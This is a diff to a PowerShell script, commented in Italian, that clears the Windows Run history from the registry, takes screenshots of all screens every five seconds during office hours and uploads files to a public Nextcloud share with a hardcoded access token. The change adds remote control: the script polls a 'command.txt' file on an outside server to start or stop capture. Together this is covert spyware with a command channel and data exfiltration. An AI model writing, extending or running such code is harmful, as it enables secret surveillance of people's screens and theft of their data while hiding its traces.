@@ -1,9 +1,12 @@
+
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+
 $AccessToken = "mwgwxBBRLwxCeGj"
 
 function Nextcloud-Upload {
 
 	[CmdletBinding()]
-	param ($SourceFilePath, $AccessToken) 
+	param ($SourceFilePath, $AccessToken)
 
 	[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -21,7 +24,27 @@ function Nextcloud-Upload {
 	Invoke-RestMethod -Uri $webdavUrl -InFile $fileObject.Fullname -Headers $headers -Method Put 
 }
 
-Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+function Nextcloud-OpenFile {
+    [CmdletBinding()]
+    param ($FileName, $AccessToken)
+
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+    $nextcloudUrl = "https://liv.nl.tab.digital/"
+	$fileUrl = "$nextcloudUrl/public.php/webdav/$FileName"
+    
+    $headers = @{
+		"Authorization"=$("Basic $([System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($("$($AccessToken):"))))");
+		"X-Requested-With"="XMLHttpRequest";
+	}
+
+    try {
+        return Invoke-RestMethod -Uri $fileUrl -Headers $headers -Method Get
+    }
+    catch {
+        return "error"
+    }
+}
 
 # CANCELLA CRONOLOGIA ESEGUI
 $regKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
@@ -51,13 +74,23 @@ Nextcloud-Upload -SourceFilePath $outputFile -AccessToken $AccessToken
 # CREA SCREEN DELLO SCHERMO
 $temp = 0
 $p1 = [System.Windows.Forms.Cursor]::Position
+$run = $true
 
 while ($true) {
 	$now       = Get-Date
     $startTime = Get-Date -Hour 9 -Minute 0 -Second 0
     $endTime   = Get-Date -Hour 18 -Minute 0 -Second 0
+	
+	$command = Nextcloud-OpenFile -FileName "command.txt" -AccessToken $AccessToken
+	if($command -eq "stop"){
+		$run = $false
+	}
+	if($command -eq "start"){
+		$run = $true
+	}
+	
+	if ($now -ge $startTime -and $now -lt $endTime -and $run) {
 
-	if ($now -ge $startTime -and $now -lt $endTime) {
 		# Crea e salva gli screen ogni 5 secondi
 		$screens = [Windows.Forms.Screen]::AllScreens
 
